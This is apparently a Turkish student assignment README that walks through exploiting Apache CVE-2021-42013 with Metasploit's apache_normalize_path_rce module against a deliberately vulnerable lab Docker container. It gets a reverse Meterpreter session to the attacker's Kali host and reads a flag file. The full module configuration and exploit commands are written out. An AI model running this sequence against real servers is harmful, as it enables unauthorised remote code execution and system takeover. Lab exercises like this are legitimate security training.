## Ödev 3: Metasploit ile Tam Kontrol (RCE ve Ters Bağlantı)

-- 1. Amacımız ve İşin Felsefesi
Önceki ödevlerde Apache Path Traversal zafiyetini manuel olarak sömürmüş ve sınırlarını keşfetmiştik.
Bu son aşamada ise siber güvenlik sektörünün standart pentest araçlarından biri olan Metasploit Framework'ü kullanarak saldırıyı otomatize edicez. 
Bu ödevde amacımız **Metasploit Framework** aracını kullanarak hedef sistemde Uzaktan Komut Çalıştırma (RCE) zafiyetini tetiklemektir.
Hedefin belleğine yerleşen ve bize komut satırı açan **Meterpreter** ajanını kullanarak sistemi tamamen ele geçireceğiz.

---

## 2.Çalıştırma Rehberi (Sistemi Nasıl Hackleriz?)
Bu ödevi test etmek için ekstra bir kurulum yapmanıza gerek yoktur, 2. Ödevde oluşturduğumuz zafiyetli Docker makinesinin (`kurban-makine`) bilgisayarınızda
çalışır durumda olması yeterlidir.
Öncelikle hedefin (Windows/Docker) ve saldırgan makinenin (Kali Linux) güncel IP adreslerini not alın. 
Ardından Kali Linux terminalinde `msfconsole` yazarak Metasploit aracını başlatın.Daha sonrasında Metasploit komut satırında sırasıyla şu ayarları girerek 
siber silahımızı hedef için yapılandırıyoruz:
```bash
# 1. RCE Exploit modülünü seç
search cve:2021-42013     
use exploit/multi/http/apache_normalize_path_rce

# 2. Kurbanın Koordinatlarını Gir
set RHOSTS <HEDEF_WINDOWS_IP>
set RPORT 8080
set TARGETURI /cgi-bin/

# 3. Saldırganın Koordinatlarını Gir
set LHOST <KALI_LINUX_IP>

# 4. Güvenlik ve Hata Engellerini Kapat
set SSL false
set AutoCheck false
```
Tüm ayarlar tamamlandıktan sonra saldırıyı başlatmak için tetiğimizi çekiyoruz:
```bash
exploit
```
Şuanda ekrana' Meterpreter session 1 opened' yazısı gelmiş olması lazım buda bizim  sisteme başarıyla sızdığımız anlamına gelir.
(İçerideki yetkileri ve sistemi doğrulamak için getuid veya sysinfo komutlarını kullanabilirsiniz)
Son olarak, kök dizine saklanan gizli bayrağı okumak için şu komutu giriyoruz (Not: cat komutundan sonra bir boşluk bırakmayı unutmayın):
```bash
cat /secret.txt
```
